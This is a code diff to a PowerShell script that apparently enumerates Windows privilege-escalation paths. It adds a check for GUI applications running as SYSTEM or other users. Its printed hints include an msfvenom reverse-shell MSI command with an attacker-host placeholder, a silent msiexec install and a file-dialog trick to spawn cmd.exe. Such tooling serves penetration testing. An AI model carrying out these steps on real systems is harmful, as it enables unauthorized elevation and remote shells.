@@ -714,13 +714,46 @@ function Check-AlwaysInstallElevated {
     # Write method
     if ($result -eq $true){
         write-host "  + Possible escalation of privileges" -ForegroundColor green
-        write-host "AlwaysInstallElevated is activated"
+        write-host "   AlwaysInstallElevated is activated"
         write-host "   1. Create a reverse shell msi: msfvenom -p windows/x64/shell_reverse_tcp LHOST=[attackerip] LPORT=[attackerport] -f msi -o reverse.msi"
         write-host "   2. Download file in windows and execute: msiexec /quiet /qn /i reverse.msi"
     } else {
        write-host "  - Not possible escalation of privileges" -ForegroundColor red 
     }
 
+
+}
+
+function Check-InsecureGUIApps{
+    [CmdletBinding()]
+	param()
+    
+    write-host "`n"
+    write-host "[*] Check insecure gui apps executing"
+
+    #Return variable
+    $result = $false
+
+    $computer = hostname
+    $pattern = "($computer|\SYSTEM)"
+
+    # save running with other users or system
+    $taskexec =  tasklist /v | Select-String  -notmatch "$env:Username" | Select-String -Pattern $pattern
+    $taskexec | Out-File -FilePath "$scriptPath\results\InsecureGUIApps.txt" -Append
+
+    if (-not ([string]::IsNullOrEmpty($taskexec))){
+      $result = $true  
+    }
+
+    # Write method
+    if ($result -eq $true){
+        write-host "  + Possible escalation of privileges" -ForegroundColor green
+        write-host "   Applications running under other users' or SYSTEM privileges: Check InsecureGUIApps.txt"
+        write-host "   1. Check if any user is in Admin group: net user [user]"
+        write-host "   2. Execute the program with privs and open file: file://c:/windows/system32/cmd.exe push ENTER"
+    } else {
+       write-host "  - Not possible escalation of privileges" -ForegroundColor red 
+    }
 
 }
 
@@ -737,7 +770,8 @@ function main {
     #Check-InsecureServicesExecutable
     #Check-TaskScheduled
     #Check-Autoruns
-    Check-AlwaysInstallElevated
+    #Check-AlwaysInstallElevated
+    Check-InsecureGUIApps
 
 }
 
